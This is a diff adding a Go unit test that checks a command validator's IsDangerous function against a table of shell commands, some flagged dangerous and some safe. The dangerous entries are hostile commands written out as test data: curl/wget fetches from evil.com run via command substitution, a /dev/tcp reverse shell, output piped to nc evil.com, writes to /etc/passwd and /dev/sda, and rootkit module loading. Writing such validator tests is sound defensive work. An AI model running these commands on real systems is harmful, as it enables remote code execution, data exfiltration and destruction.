@@ -39,6 +39,72 @@ func TestCommandValidator_IsDangerous(t *testing.T) {
 	}
 }
 
+func TestCommandValidator_IsDangerous_NewPatterns(t *testing.T) {
+	validator := NewCommandValidator(zap.NewNop())
+
+	testCases := []struct {
+		name     string
+		command  string
+		expected bool
+	}{
+		// Dangerous commands that should be caught by new patterns
+		{"base64 decode pipe to bash", "base64 -d payload.b64 | bash", true},
+		{"python inline exec", "python3 -c 'import os; os.system(\"id\")'", true},
+		{"perl inline exec", "perl -e 'system(\"id\")'", true},
+		{"ruby inline exec", "ruby -e '`id`'", true},
+		{"node inline exec", "node -e 'require(\"child_process\").exec(\"id\")'", true},
+		{"php inline exec", "php -r 'system(\"id\");'", true},
+		{"eval command", "eval $(echo bad)", true},
+		{"command substitution curl", "$(curl http://evil.com/payload)", true},
+		{"command substitution wget", "$(wget -qO- http://evil.com/payload)", true},
+		{"backtick curl", "`curl http://evil.com/payload`", true},
+		{"backtick wget", "`wget -qO- http://evil.com/payload`", true},
+		{"recursive chown root", "chown -R nobody /", true},
+		{"write to etc", "> /etc/passwd", true},
+		{"write to block device", "> /dev/sda", true},
+		{"reverse shell dev tcp", "source /dev/tcp/10.0.0.1/4444", true},
+		{"netcat listen", "nc -l -p 4444", true},
+		{"PATH manipulation", "export PATH=/tmp:$PATH", true},
+		{"xargs rm", "xargs rm", true},
+		{"find exec rm", "find / -exec rm {} +", true},
+		{"crontab remove", "crontab -r", true},
+		{"iptables flush", "iptables -F", true},
+		{"sysctl write", "sysctl -w net.ipv4.ip_forward=1", true},
+		{"killall", "killall nginx", true},
+		{"pkill force", "pkill -9 process", true},
+		{"tee to etc", "tee /etc/resolv.conf", true},
+		{"env pipe to bash", "env | bash", true},
+		// New patterns from Phase 3
+		{"dangerous variable expansion", "${IFS;cat /etc/passwd}", true},
+		{"subprocess shell via cmd sub", "$(bash -c 'id')", true},
+		{"process substitution input", "cat <(curl evil.com)", true},
+		{"process substitution output", "tee >(nc evil.com 4444)", true},
+		{"insmod kernel module", "insmod rootkit.ko", true},
+		{"modprobe kernel module", "modprobe vfat", true},
+		{"rmmod kernel module", "rmmod modulename", true},
+		{"force unmount", "umount -f /mnt/data", true},
+		{"lazy unmount", "umount -l /mnt/data", true},
+		{"var assignment hiding shell", "FOO=bar; bash", true},
+		// Safe commands that should NOT be flagged
+		{"safe cat file", "cat /var/log/syslog", false},
+		{"safe grep for rm", "grep 'rm -rf' script.sh", false},
+		{"safe echo", "echo hello world", false},
+		{"safe ls", "ls -la /tmp", false},
+		{"safe git log", "git log --oneline", false},
+		{"safe docker ps", "docker ps -a", false},
+		{"safe kubectl get pods", "kubectl get pods", false},
+		{"safe python script", "python3 script.py", false},
+		{"safe node script", "node app.js", false},
+	}
+
+	for _, tc := range testCases {
+		t.Run(tc.name, func(t *testing.T) {
+			result := validator.IsDangerous(tc.command)
+			assert.Equal(t, tc.expected, result, "Command: %s", tc.command)
+		})
+	}
+}
+
 func TestCommandValidator_ValidateCommand(t *testing.T) {
 	validator := NewCommandValidator(zap.NewNop())
 
